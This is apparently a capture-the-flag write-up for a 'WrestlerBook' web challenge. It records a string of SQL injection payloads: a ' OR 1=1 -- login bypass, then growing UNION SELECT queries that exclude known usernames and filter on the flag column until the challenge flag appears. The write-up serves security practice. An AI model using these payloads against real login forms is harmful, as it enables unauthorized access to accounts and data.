Challenge: 
"WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively
for wrestlers, so if you didn't get an invite don't even bother trying to view our profile."

Solution:

First thing I try on here is a simple ' OR 1=1 -- which gets us into hulk hogan. There is a flag attribute that he doesnt have.
After trying a lot of different injections I finally crafted this:

' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie') --

which brought us to a new page who is Jim Duggan and who also doesnt have a flag
so my guess is we keep adding these users to the list of users we dont want. Maybe we will soon get a user with a flag.

' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim') --

next username still no flag: machoasf

' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf') --

Another one:milliondollarman

' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman') --

'rich_flair'

' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') --

'user1': George Steele

' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair', 'user1', 'user10', 'user100','user101','user102', 'user103', 'user104', 'user105','user106','user107','user108','user109') --


New idea is to check who isnt in the first set of users and who dont have the name user in their username

' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') AND username NOT LIKE 'user%' --


SELECT * FROM users WHERE username = '' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') AND username NOT LIKE 'user%' ' and password = '' OR 1=1 --'

SELECT * FROM users WHERE username = '
' UNION SELECT * FROM users WHERE username NOT LIKE 'user%' AND username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') ' and password = ''



NOW:
	write query filtering something else than username
	
' UNION SELECT * FROM users WHERE password LIKE '%sun% '


***After filtering based on ID I notied that the profiles were coming up in the same exact order as they were when I filtered by username
***which made me realize the other things listed must also be parts of the databse. I reconstructed this query below 


' UNION SELECT * FROM users WHERE flag NOT LIKE 'N%' AND flag NOT LIKE 'ex%' --

and FINALLY WHEN USING QUERY ABOVE we get:

"Generic Wrestler
Username: user84
Age: 65
Title: N/A
Flag: sun{ju57_4n07h3r_5ql1_ch4ll}"
